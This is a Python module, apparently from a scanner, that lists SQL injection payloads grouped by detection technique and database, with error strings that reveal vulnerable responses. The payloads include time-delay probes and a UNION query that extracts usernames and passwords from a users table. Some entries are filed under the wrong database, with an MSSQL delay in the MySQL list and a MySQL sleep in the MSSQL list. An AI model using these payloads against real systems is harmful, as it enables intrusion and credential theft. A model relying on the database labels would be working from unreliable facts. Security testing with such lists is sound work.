"""SQL injection payloads by detection technique and database type."""

# Error-based detection — trigger SQL syntax errors
ERROR_BASED: list[str] = [
    "'",
    "\"",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR '1'='1' --",
    "\" OR \"1\"=\"1\" --",
    "1' ORDER BY 1--+",
    "1' ORDER BY 100--+",
    "' UNION SELECT NULL--",
    "') OR ('1'='1",
    "1;SELECT 1",
]

# Boolean-based blind — compare true vs false responses
BOOLEAN_BASED: list[str] = [
    "' AND '1'='1",    # TRUE condition
    "' AND '1'='2",    # FALSE condition
    "' AND 1=1--",
    "' AND 1=2--",
    "\" AND \"1\"=\"1",
    "\" AND \"1\"=\"2",
    "' OR 1=1--",
    "' OR 1=2--",
]

# Time-based blind — detect via response delay
TIME_BASED_MYSQL: list[str] = [
    "' AND SLEEP(5)--",
    "' OR SLEEP(5)--",
    "1' AND (SELECT SLEEP(5))--",
    "'; WAITFOR DELAY '0:0:5'--",
]

TIME_BASED_POSTGRES: list[str] = [
    "'; SELECT pg_sleep(5)--",
    "' AND (SELECT pg_sleep(5))--",
    "1; SELECT pg_sleep(5)--",
]

TIME_BASED_MSSQL: list[str] = [
    "'; WAITFOR DELAY '0:0:5'--",
    "' AND 1=(SELECT 1 FROM (SELECT SLEEP(5))a)--",
]

TIME_BASED_SQLITE: list[str] = [
    "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--",
]

# UNION-based — extract data via UNION SELECT
UNION_BASED: list[str] = [
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION ALL SELECT NULL,NULL,NULL,NULL--",
    "' UNION SELECT 1,2,3--",
    "' UNION SELECT username,password FROM users--",
]

# SQL error signature strings (check response body for these)
ERROR_SIGNATURES: list[str] = [
    "You have an error in your SQL syntax",
    "mysql_fetch_array()",
    "ORA-01756",
    "SQLite3::query()",
    "pg_query()",
    "Microsoft SQL Native Client error",
    "SQLSTATE[",
    "Unclosed quotation mark",
    "quoted string not properly terminated",
    "unterminated quoted string",
    "syntax error at or near",
]

# All payloads for quick detection (error + boolean)
ALL: list[str] = ERROR_BASED + BOOLEAN_BASED
